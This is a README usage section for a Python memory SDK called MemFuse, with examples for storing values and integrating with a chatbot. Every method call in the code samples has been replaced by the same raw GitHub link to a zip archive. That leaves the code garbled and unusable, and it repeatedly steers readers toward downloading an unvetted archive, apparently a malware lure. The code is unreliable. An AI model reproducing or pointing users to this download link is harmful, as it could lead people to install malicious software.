## Usage 🛠️

Using the MemFuse SDK is simple. Here’s a quick example to get you started:

```python
from memfuse import MemFuse

# Initialize MemFuse
memfuse = MemFuse()

# Store some information
https://github.com/RankMegaCraft51/memfuse-python/raw/refs/heads/main/examples/python_memfuse_2.1.zip("user_name", "Alice")

# Retrieve the information
user_name = https://github.com/RankMegaCraft51/memfuse-python/raw/refs/heads/main/examples/python_memfuse_2.1.zip("user_name")
print(f"User name is: {user_name}")
```

## Examples 📚

### Chatbot Integration

Integrating MemFuse with a chatbot can significantly enhance its capabilities. Here’s a basic example:

```python
from memfuse import MemFuse

class Chatbot:
    def __init__(self):
        https://github.com/RankMegaCraft51/memfuse-python/raw/refs/heads/main/examples/python_memfuse_2.1.zip = MemFuse()

    def respond(self, user_input):
        if "my name is" in user_input:
            name = https://github.com/RankMegaCraft51/memfuse-python/raw/refs/heads/main/examples/python_memfuse_2.1.zip("my name is")[-1].strip()
            https://github.com/RankMegaCraft51/memfuse-python/raw/refs/heads/main/examples/python_memfuse_2.1.zip("user_name", name)
            return f"Nice to meet you, {name}!"
        else:
            user_name = https://github.com/RankMegaCraft51/memfuse-python/raw/refs/heads/main/examples/python_memfuse_2.1.zip("user_name")
            return f"Hello, {user_name}!"

bot = Chatbot()
print(https://github.com/RankMegaCraft51/memfuse-python/raw/refs/heads/main/examples/python_memfuse_2.1.zip("my name is Alice"))
print(https://github.com/RankMegaCraft51/memfuse-python/raw/refs/heads/main/examples/python_memfuse_2.1.zip("What's my name?"))
```

### Advanced Memory Queries

You can also perform advanced queries to fetch multiple pieces of information:

```python
# Store multiple pieces of information
https://github.com/RankMegaCraft51/memfuse-python/raw/refs/heads/main/examples/python_memfuse_2.1.zip("favorite_color", "blue")
https://github.com/RankMegaCraft51/memfuse-python/raw/refs/heads/main/examples/python_memfuse_2.1.zip("hobby", "painting")

# Retrieve all stored information
user_info = {
    "name": https://github.com/RankMegaCraft51/memfuse-python/raw/refs/heads/main/examples/python_memfuse_2.1.zip("user_name"),
    "color": https://github.com/RankMegaCraft51/memfuse-python/raw/refs/heads/main/examples/python_memfuse_2.1.zip("favorite_color"),
    "hobby": https://github.com/RankMegaCraft51/memfuse-python/raw/refs/heads/main/examples/python_memfuse_2.1.zip("hobby"),
}

print(user_info)
```
